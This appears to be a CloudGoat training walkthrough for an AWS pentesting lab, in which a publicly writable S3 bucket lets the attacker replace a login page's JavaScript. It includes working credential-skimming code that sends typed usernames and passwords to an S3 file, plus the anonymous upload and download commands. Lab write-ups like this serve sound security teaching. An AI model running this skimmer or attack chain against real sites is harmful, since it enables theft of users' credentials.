Summary
-------

In this scenario, you start as an unauthenticated user visiting the "Hacksmarter Internal Portal." By inspecting the web application's source code, you must enumerate the backend infrastructure and identify that static assets are hosted in an unsecured S3 bucket.

You will then verify that the bucket allows anonymous write access. Using this misconfiguration, you will perform a **Supply Chain Attack** by overwriting a legitimate JavaScript library used by the login page with a malicious payload. Finally, you will harvest the credentials of an automated administrator bot that visits the site, retrieving the final flag from a text file exfiltrated to the S3 bucket.

Detailed Walkthrough
--------------------

The purpose of CloudGoat is to help people learn AWS Pentesting. This scenario focuses on **S3 misconfigurations** and **Cross-Site Scripting (XSS)** via static asset hijacking.

### Step 1: Deployment and Reconnaissance

After deploying the scenario, CloudGoat outputs the IP address of the target web server.

1.  **Access the Target:** Open the provided URL (`http://<EC2_IP>`) in your web browser. You will see a login portal for "Hacksmarter Employees."

2.  **Inspect Source Code:** Right-click the page and select **View Page Source** (or Inspect Element). Look for where the scripts and images are loading from.

You should notice that the application loads its authentication logic from an external source rather than the local server:

```
<script src="https://cg-assets-[ID].s3.amazonaws.com/auth-module.js"></script>

```

**Analysis:** This reveals the S3 bucket name (`cg-assets-[ID]`) and a potential vector for attack. If we can modify `auth-module.js`, every user visiting this site will execute our code.

### Step 2: Enumerating S3 Permissions

Now that you have the bucket name, check if it is properly secured. Since we don't have AWS keys for this scenario, we check for **anonymous** access using the `--no-sign-request` flag.

Run the following command in your terminal (replace `[BUCKET_NAME]` with the one you found):

```
aws s3 ls s3://[BUCKET_NAME]/ --no-sign-request

```

-   **Result:** If the command lists files (`logo.svg`, `auth-module.js`), it means the bucket allows public list access.

-   **Next Test:** Check if you can **write** to the bucket. This is the critical misconfiguration.

### Step 3: Crafting the Exploit (XSS)

The goal is to capture the credentials entered into the login form. Since the `auth-module.js` file is loaded by the browser, we can overwrite it with a script that adds a "click listener" to the Sign In button.

Create a file named `malicious_auth.js` on your local machine with the following code:

```
// Wait for the page to fully load
window.addEventListener('load', function() {
    
    // Find the login button
    var btn = document.getElementById('login-btn');
    
    // Add a click listener to the button
    btn.addEventListener('click', function() {
        
        // 1. Steal the values from the input fields
        var user = document.getElementById('username').value;
        var pass = document.getElementById('password').value;
        var lootData = "CAPTURED CREDENTIALS:\nUsername: " + user + "\nPassword: " + pass;
        
        // 2. Dynamically find the bucket URL from the existing script tag
        // (This saves you from hardcoding the ID)
        var bucketId = document.querySelector('script[src*="auth-module.js"]').src.split('/')[2].split('.')[0];
        var lootUrl = 'https://' + bucketId + '.s3.amazonaws.com/loot.txt';
        
        // 3. Exfiltrate the data to S3
        // We use 'keepalive: true' to ensure the request finishes even if the page navigates away
        fetch(lootUrl, {
            method: 'PUT',
            body: lootData,
            keepalive: true
        }).then(res => console.log('Loot sent to ' + lootUrl));
        
    });
});

```

### Step 4: Launching the Attack

Overwrite the legitimate file in the bucket with your malicious version.

```
aws s3 cp malicious_auth.js s3://[BUCKET_NAME]/auth-module.js --no-sign-request

```

**Verification:**

1.  Go back to the browser.

2.  **Hard Refresh** the page (`Ctrl+F5` or `Cmd+Shift+R`) to clear the browser cache.

3.  Open the Developer Console (`F12`). You should see "Exploit Loaded".

### Step 5: Harvesting Credentials

The scenario simulates an "Admin Bot" that logs into the portal every minute to check system status.

1.  Wait approximately **30-60 seconds** for the bot to run its cycle.

2.  Check the bucket for a new file named `loot.txt`.

    aws s3 ls s3://[BUCKET_NAME]/ --no-sign-request

3.  Download and read the stolen credentials:

    aws s3 cp s3://[BUCKET_NAME]/loot.txt - --no-sign-request cat loot.txt

### Final Flag

You should see the captured output:

```
CAPTURED CREDENTIALS:
User: tyler
Pass: [REDACTED]

```

**Conclusion:** This scenario demonstrates the danger of hosting static assets in public S3 buckets with overly permissive policies (`s3:PutObject` allowed for `Principal: *`). By compromising a single JavaScript file, an attacker can bypass all perimeter security and attack authenticated users directly in their browsers.